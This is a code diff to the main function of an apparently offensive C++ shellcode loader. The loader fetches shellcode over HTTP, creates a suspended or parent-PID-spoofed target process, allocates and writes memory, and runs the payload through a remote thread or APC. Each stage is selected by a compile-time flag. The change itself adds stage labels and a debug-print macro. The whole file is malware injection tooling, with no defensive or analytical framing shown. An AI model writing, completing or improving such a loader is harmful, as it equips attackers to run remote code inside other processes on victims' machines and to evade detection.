@@ -1,5 +1,6 @@
 #include "config.h"
 #include "context.h"
+#include "debug.h"
 #include <cstdio>
 
 #ifdef USE_SHELLCODE_FETCH_HTTP
@@ -46,12 +47,14 @@ int main() {
         return 1;
     }
 
+shellcode:
 #if defined(USE_SHELLCODE_FETCH_HTTP)
     if (!GetShellcode_Http(&ctx)) goto cleanup;
 #else
     #error "No shellcode technique selected"
 #endif
 
+create:
 #if defined(USE_CREATE_SUSPENDED)
     if (!CreateTarget_Suspended(&ctx)) goto cleanup;
 #elif defined(USE_CREATE_PPID_SPOOF)
@@ -60,6 +63,7 @@ int main() {
     #error "No create technique selected"
 #endif
 
+allocate:
 #if defined(USE_ALLOCATE_VALLOC)
     if (!AllocateMemory_VAlloc(&ctx)) goto cleanup;
 #elif defined(USE_ALLOCATE_SECTION)
@@ -68,18 +72,21 @@ int main() {
     #error "No allocate technique selected"
 #endif
 
+write:
 #if defined(USE_WRITE_WPM)
     if (!WritePayload_WPM(&ctx)) goto cleanup;
 #else
     #error "No write technique selected"
 #endif
 
+protect:
 #if defined(USE_PROTECT_VPROTECT)
     if (!ProtectMemory_VProtect(&ctx)) goto cleanup;
 #else
     #error "No protect technique selected"
 #endif
 
+execute:
 #if defined(USE_EXECUTE_REMOTE_THREAD)
     if (!Execute_RemoteThread(&ctx)) goto cleanup;
 #elif defined(USE_EXECUTE_APC)
@@ -88,7 +95,7 @@ int main() {
     #error "No execute technique selected"
 #endif
 
-    printf("[+] Injection pipeline complete\n");
+    DBG("[+] Injection pipeline complete");
 
 cleanup:
     Cleanup(&ctx);
